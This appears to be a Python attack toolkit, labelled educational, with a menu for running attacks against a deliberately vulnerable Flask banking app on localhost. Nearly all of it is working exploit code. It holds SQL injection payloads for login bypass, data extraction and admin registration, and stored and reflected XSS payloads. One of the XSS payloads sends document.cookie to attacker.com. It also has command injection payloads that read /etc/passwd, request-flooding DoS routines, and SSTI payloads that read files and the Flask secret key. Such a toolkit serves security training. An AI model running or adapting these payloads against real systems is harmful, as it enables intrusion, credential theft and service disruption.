"""
CYBER ATTACK DEMONSTRATION SCRIPTS
WARNING: For educational purposes only. Use only on the vulnerable version
of the banking application in a controlled environment.
"""

import requests
import time
import threading
from bs4 import BeautifulSoup
import json

# Target URL - change if needed
BASE_URL = "http://localhost:5000"

# Color codes for terminal output
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def print_header(text):
    print(f"\n{Colors.HEADER}{Colors.BOLD}{'='*70}{Colors.ENDC}")
    print(f"{Colors.HEADER}{Colors.BOLD}{text.center(70)}{Colors.ENDC}")
    print(f"{Colors.HEADER}{Colors.BOLD}{'='*70}{Colors.ENDC}\n")

def print_success(text):
    print(f"{Colors.OKGREEN}[✓] {text}{Colors.ENDC}")

def print_warning(text):
    print(f"{Colors.WARNING}[!] {text}{Colors.ENDC}")

def print_error(text):
    print(f"{Colors.FAIL}[✗] {text}{Colors.ENDC}")

def print_info(text):
    print(f"{Colors.OKBLUE}[i] {text}{Colors.ENDC}")


# ============================================================================
# ATTACK 1: SQL INJECTION
# ============================================================================

def sql_injection_login_bypass():
    """
    SQL Injection Attack - Login Bypass
    Exploits vulnerable login form to bypass authentication
    """
    print_header("SQL INJECTION - LOGIN BYPASS")
    
    payloads = [
        {"username": "admin' OR '1'='1' --", "password": "anything"},
        {"username": "' OR 1=1 --", "password": ""},
        {"username": "admin'--", "password": ""},
        {"username": "' OR 'a'='a", "password": "' OR 'a'='a"},
    ]
    
    for i, payload in enumerate(payloads, 1):
        print_info(f"Attempt {i}: Username='{payload['username']}', Password='{payload['password']}'")
        
        try:
            session = requests.Session()
            response = session.post(f"{BASE_URL}/login", data=payload, allow_redirects=False)
            
            if response.status_code == 302:  # Redirect means successful login
                print_success(f"SQL Injection successful! Bypassed authentication")
                print_success(f"Redirected to: {response.headers.get('Location')}")
                
                # Try to access dashboard
                dashboard = session.get(f"{BASE_URL}/dashboard")
                if "Welcome" in dashboard.text:
                    print_success("Successfully accessed dashboard without valid credentials!")
                return True
            else:
                print_warning(f"Payload failed (Status: {response.status_code})")
        except Exception as e:
            print_error(f"Error: {e}")
    
    return False

def sql_injection_data_extraction():
    """
    SQL Injection Attack - Data Extraction
    Attempts to extract sensitive data using UNION-based SQL injection
    """
    print_header("SQL INJECTION - DATA EXTRACTION")
    
    # Union-based injection payloads
    payloads = [
        "' UNION SELECT NULL,username,password,balance,'Admin',1 FROM users--",
        "' UNION SELECT id,username,password,balance,account_type,is_admin FROM users--",
        "1' OR '1'='1' UNION SELECT NULL,username,password,NULL,NULL,NULL FROM users--",
    ]
    
    print_info("Attempting to extract user data...")
    
    for payload in payloads:
        print_info(f"Payload: {payload}")
        try:
            data = {"username": payload, "password": "anything"}
            response = requests.post(f"{BASE_URL}/login", data=data)
            
            if "admin" in response.text.lower() or "password" in response.text.lower():
                print_success("Data extraction may be successful!")
                print_info("Check response for leaked data")
        except Exception as e:
            print_error(f"Error: {e}")

def sql_injection_register():
    """
    SQL Injection Attack - Malicious Registration
    Registers user with SQL injection to gain admin privileges
    """
    print_header("SQL INJECTION - PRIVILEGE ESCALATION")
    
    # Try to register as admin
    payload = {
        "username": "hacker', 10000, 'Premium', 1)--",
        "password": "password123"
    }
    
    print_info(f"Attempting to register with admin privileges...")
    print_info(f"Username payload: {payload['username']}")
    
    try:
        response = requests.post(f"{BASE_URL}/register", data=payload)
        if response.status_code == 302 or "success" in response.text.lower():
            print_success("Registration potentially successful with SQL injection!")
            print_warning("This could create an admin account")
        else:
            print_warning("Payload may have failed")
    except Exception as e:
        print_error(f"Error: {e}")


# ============================================================================
# ATTACK 2: CROSS-SITE SCRIPTING (XSS)
# ============================================================================

def xss_stored_attack():
    """
    Stored XSS Attack
    Injects malicious JavaScript that gets stored in database
    """
    print_header("CROSS-SITE SCRIPTING (XSS) - STORED")
    
    xss_payloads = [
        "<script>alert('XSS Vulnerability!')</script>",
        "<img src=x onerror='alert(\"XSS\")'>",
        "<svg/onload=alert('XSS')>",
        "<iframe src='javascript:alert(\"XSS\")'></iframe>",
        "<<SCRIPT>alert('XSS');//<</SCRIPT>",
        "<script>document.location='http://attacker.com/?cookie='+document.cookie</script>",
    ]
    
    print_info("Attempting to inject XSS payloads via registration...")
    
    for i, payload in enumerate(xss_payloads, 1):
        username = f"xss_test{i}"
        print_info(f"Testing payload {i}: {payload[:50]}...")
        
        try:
            # Register with XSS payload in username
            data = {"username": payload, "password": "test123"}
            response = requests.post(f"{BASE_URL}/register", data=data)
            
            if response.status_code == 200 or response.status_code == 302:
                print_success(f"Payload {i} injected successfully! Status code: {response.status_code}")
                print_warning("XSS will execute when admin views user list")
        except Exception as e:
            print_error(f"Error with payload {i}: {e}")

def xss_reflected_attack():
    """
    Reflected XSS Attack
    Tests for XSS in URL parameters or form inputs
    """
    print_header("CROSS-SITE SCRIPTING (XSS) - REFLECTED")
    
    print_info("Testing reflected XSS in transaction description...")
    
    # Login first
    session = requests.Session()
    login_data = {"username": "john_doe", "password": "pass123"}
    session.post(f"{BASE_URL}/login", data=login_data)
    
    xss_payload = "<script>alert(document.cookie)</script>"
    transfer_data = {
        "recipient": "admin",
        "amount": "1",
        "description": xss_payload
    }
    
    try:
        response = session.post(f"{BASE_URL}/transfer", data=transfer_data)
        print_success("XSS payload submitted in transfer description")
        print_warning("Check dashboard for script execution")
    except Exception as e:
        print_error(f"Error: {e}")


# ============================================================================
# ATTACK 3: COMMAND INJECTION
# ============================================================================

def command_injection_attack():
    """
    Command Injection Attack
    Exploits vulnerable balance check feature to execute system commands
    """
    print_header("COMMAND INJECTION")
    
    # Login first
    session = requests.Session()
    login_data = {"username": "john_doe", "password": "pass123"}
    session.post(f"{BASE_URL}/login", data=login_data)
    
    payloads = [
        "1; ls -la",
        "1 && whoami",
        "1 | cat /etc/passwd",
        "1; pwd",
        "1 && dir",  # Windows
        "1; echo 'Command Injection Successful'",
        "1 && net user",  # Windows - list users
        "1; uname -a",  # Linux - system info
        "1 && ipconfig",  # Windows - network info
        "1; cat /etc/hosts",
    ]
    
    print_info("Attempting command injection via balance check...")
    
    for i, payload in enumerate(payloads, 1):
        print_info(f"Payload {i}: {payload}")
        
        try:
            data = {"account_id": payload}
            response = session.post(f"{BASE_URL}/check_balance", data=data)
            
            if response.status_code == 200:
                # Check if command output is in response
                if any(keyword in response.text.lower() for keyword in ['root', 'admin', 'user', 'windows', 'linux', 'directory']):
                    print_success(f"Command injection successful!")
                    print_success(f"Response contains command output")
                    print_info(f"Response preview: {response.text[:200]}...")
                else:
                    print_warning(f"Payload executed but output unclear")
        except Exception as e:
            print_error(f"Error: {e}")
        
        time.sleep(0.5)


# ============================================================================
# ATTACK 4: SESSION HIJACKING
# ============================================================================

def session_hijacking_attack():
    """
    Session Hijacking Attack
    Attempts to hijack admin session by manipulating cookies
    """
    print_header("SESSION HIJACKING")
    
    print_info("Step 1: Creating a normal user session...")
    
    # Login as normal user
    session = requests.Session()
    login_data = {"username": "john_doe", "password": "pass123"}
    response = session.post(f"{BASE_URL}/login", data=login_data)
    
    print_success("Normal user session created")
    print_info(f"Session cookies: {session.cookies.get_dict()}")
    
    print_info("\nStep 2: Attempting to hijack admin privileges...")
    
    # Try to access admin panel by manipulating session
    try:
        # Attempt 1: Try to access admin page directly
        admin_response = session.get(f"{BASE_URL}/admin")
        
        if admin_response.status_code == 200 and "admin" in admin_response.text.lower():
            print_success("Session hijacking successful! Accessed admin panel")
            print_warning("Vulnerable session management detected")
        else:
            print_warning("Direct admin access failed")
        
        # Attempt 2: Try to forge admin cookie
        print_info("\nStep 3: Attempting cookie manipulation...")
        
        # In vulnerable mode, we could try to set is_admin in session
        # This demonstrates the concept
        print_info("In vulnerable mode, session can be manipulated")
        print_warning("Attacker could forge session cookies with is_admin=1")
        
    except Exception as e:
        print_error(f"Error: {e}")

def session_fixation_attack():
    """
    Session Fixation Attack
    Attempts to fix a session ID and force victim to use it
    """
    print_header("SESSION FIXATION")
    
    print_info("Demonstrating session fixation vulnerability...")
    
    # Create session with known ID
    session = requests.Session()
    
    print_info("Step 1: Attacker sets a known session ID")
    print_info("Step 2: Victim logs in with this session ID")
    print_info("Step 3: Attacker uses the same session ID to access victim's account")
    
    print_warning("In vulnerable mode, session IDs are predictable")
    print_warning("Weak secret key allows session forgery")


# ============================================================================
# ATTACK 5: DENIAL OF SERVICE (DoS)
# ============================================================================

def dos_attack_rapid_requests():
    """
    DoS Attack - Rapid Requests
    Floods the server with requests to cause service disruption
    """
    print_header("DENIAL OF SERVICE (DoS) - RAPID REQUESTS")
    
    print_warning("Starting DoS attack with rapid requests...")
    print_info("This will flood the transfer endpoint")
    
    # Login first
    session = requests.Session()
    login_data = {"username": "john_doe", "password": "pass123"}
    session.post(f"{BASE_URL}/login", data=login_data)
    
    successful_requests = 0
    failed_requests = 0
    
    def send_request(session_cookie):
        try:
            s = requests.Session()
            s.cookies.update(session_cookie)
            data = {"recipient": "admin", "amount": "0.01"}
            response = s.post(f"{BASE_URL}/transfer", data=data, timeout=1)
            return response.status_code
        except:
            return None
    
    print_info("Sending 100 rapid requests...")
    
    start_time = time.time()
    
    for i in range(100):
        status = send_request(session.cookies)
        
        if status == 200 or status == 302:
            successful_requests += 1
        elif status == 429:
            failed_requests += 1
            print_warning(f"Rate limited at request {i+1}")
            break
        else:
            failed_requests += 1
        
        if (i + 1) % 10 == 0:
            print_info(f"Sent {i+1} requests...")
    
    end_time = time.time()
    duration = end_time - start_time
    
    print_success(f"\nDoS Attack Results:")
    print_info(f"Total requests: 100")
    print_info(f"Successful: {successful_requests}")
    print_info(f"Failed/Blocked: {failed_requests}")
    print_info(f"Duration: {duration:.2f} seconds")
    print_info(f"Rate: {100/duration:.2f} requests/second")
    
    if failed_requests > 0:
        print_success("Server has rate limiting protection")
    else:
        print_warning("Server vulnerable to DoS - no rate limiting detected!")

def dos_attack_resource_exhaustion():
    """
    DoS Attack - Resource Exhaustion
    Creates many database operations to exhaust resources
    """
    print_header("DENIAL OF SERVICE (DoS) - RESOURCE EXHAUSTION")
    
    print_info("Attempting to exhaust server resources...")
    
    threads = []
    
    def create_accounts():
        for i in range(10):
            try:
                data = {
                    "username": f"dos_user_{time.time()}_{i}",
                    "password": "password123"
                }
                requests.post(f"{BASE_URL}/register", data=data, timeout=2)
            except:
                pass
    
    print_info("Spawning multiple registration threads...")
    
    for i in range(5):
        thread = threading.Thread(target=create_accounts)
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()
    
    print_success("Resource exhaustion attack completed")
    print_warning("Check server CPU and memory usage")


# ============================================================================
# ATTACK 6: FLASK RCE (Remote Code Execution)
# ============================================================================

def flask_rce_ssti_attack():
    """
    Flask RCE - Server-Side Template Injection
    Exploits template rendering vulnerabilities
    """
    print_header("FLASK RCE - SERVER-SIDE TEMPLATE INJECTION (SSTI)")
    
    print_info("Testing for SSTI vulnerabilities...")
    
    ssti_payloads = [
        "{{ 7*7 }}",  # Simple test
        "{{ config.items() }}",  # Config disclosure
        "{{ ''.__class__.__mro__[1].__subclasses__() }}",  # Class exploration
        "{{ self.__init__.__globals__.__builtins__ }}",  # Builtins access
        "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}",  # File read
        "{{ config['SECRET_KEY'] }}",  # Secret key disclosure
    ]
    
    # Try in registration
    for i, payload in enumerate(ssti_payloads, 1):
        print_info(f"Testing payload {i}: {payload[:50]}...")
        
        try:
            data = {"username": payload, "password": "test123"}
            response = requests.post(f"{BASE_URL}/register", data=data)
            
            # Check if payload was executed
            if "49" in response.text:  # 7*7 = 49
                print_success("SSTI vulnerability detected! (7*7 = 49 executed)")
            elif "SECRET_KEY" in response.text:
                print_success("Secret key disclosed!")
            elif "subclass" in response.text:
                print_success("Class exploration successful!")
        except Exception as e:
            print_error(f"Error: {e}")

def flask_debug_mode_exploitation():
    """
    Flask Debug Mode Exploitation
    Tests if debug mode is enabled and exploitable
    """
    print_header("FLASK DEBUG MODE EXPLOITATION")
    
    print_info("Checking if Flask debug mode is enabled...")
    
    try:
        # Try to trigger an error to see debug page
        response = requests.get(f"{BASE_URL}/nonexistent_page")
        
        if "Werkzeug" in response.text or "Debugger" in response.text:
            print_success("Debug mode is ENABLED!")
            print_warning("Debug mode allows code execution via console")
            print_info("Debug console PIN might be brute-forceable")
        else:
            print_info("Debug mode appears to be disabled")
    except Exception as e:
        print_error(f"Error: {e}")


# ============================================================================
# MAIN ATTACK MENU
# ============================================================================

def run_all_attacks():
    """Run all attacks in sequence"""
    print_header("RUNNING ALL ATTACKS")
    
    print_warning("⚠️  WARNING: Use only on vulnerable mode in test environment")
    print_warning("⚠️  Ensure the application is running at " + BASE_URL)
    
    input("\nPress Enter to continue...")
    
    # SQL Injection
    sql_injection_login_bypass()
    time.sleep(1)
    sql_injection_data_extraction()
    time.sleep(1)
    sql_injection_register()
    time.sleep(1)
    
    # XSS
    xss_stored_attack()
    time.sleep(1)
    xss_reflected_attack()
    time.sleep(1)
    
    # Command Injection
    command_injection_attack()
    time.sleep(1)
    
    # Session Hijacking
    session_hijacking_attack()
    time.sleep(1)
    session_fixation_attack()
    time.sleep(1)
    
    # DoS
    dos_attack_rapid_requests()
    time.sleep(1)
    dos_attack_resource_exhaustion()
    time.sleep(1)
    
    # Flask RCE
    flask_rce_ssti_attack()
    time.sleep(1)
    flask_debug_mode_exploitation()
    
    print_header("ALL ATTACKS COMPLETED")

def main_menu():
    """Interactive menu for running attacks"""
    while True:
        print_header("CYBER ATTACK DEMONSTRATION MENU")
        print(f"{Colors.OKBLUE}Target: {BASE_URL}{Colors.ENDC}")
        print("\n1.  SQL Injection - Login Bypass")
        print("2.  SQL Injection - Data Extraction")
        print("3.  SQL Injection - Privilege Escalation")
        print("4.  Cross-Site Scripting (XSS) - Stored")
        print("5.  Cross-Site Scripting (XSS) - Reflected")
        print("6.  Command Injection")
        print("7.  Session Hijacking")
        print("8.  Session Fixation")
        print("9.  Denial of Service - Rapid Requests")
        print("10. Denial of Service - Resource Exhaustion")
        print("11. Flask RCE - SSTI")
        print("12. Flask Debug Mode Exploitation")
        print("13. Run ALL Attacks")
        print("0.  Exit")
        
        choice = input(f"\n{Colors.OKCYAN}Select attack (0-13): {Colors.ENDC}")
        
        if choice == "1":
            sql_injection_login_bypass()
        elif choice == "2":
            sql_injection_data_extraction()
        elif choice == "3":
            sql_injection_register()
        elif choice == "4":
            xss_stored_attack()
        elif choice == "5":
            xss_reflected_attack()
        elif choice == "6":
            command_injection_attack()
        elif choice == "7":
            session_hijacking_attack()
        elif choice == "8":
            session_fixation_attack()
        elif choice == "9":
            dos_attack_rapid_requests()
        elif choice == "10":
            dos_attack_resource_exhaustion()
        elif choice == "11":
            flask_rce_ssti_attack()
        elif choice == "12":
            flask_debug_mode_exploitation()
        elif choice == "13":
            run_all_attacks()
        elif choice == "0":
            print_info("Exiting...")
            break
        else:
            print_error("Invalid choice")
        
        input(f"\n{Colors.OKCYAN}Press Enter to continue...{Colors.ENDC}")

if __name__ == "__main__":
    print(f"{Colors.WARNING}")
    print("="*70)
    print("  CYBER ATTACK DEMONSTRATION TOOLKIT")
    print("  WARNING: FOR EDUCATIONAL PURPOSES ONLY")
    print("  Use only on the vulnerable version in a test environment")
    print("="*70)
    print(f"{Colors.ENDC}")
    
    main_menu()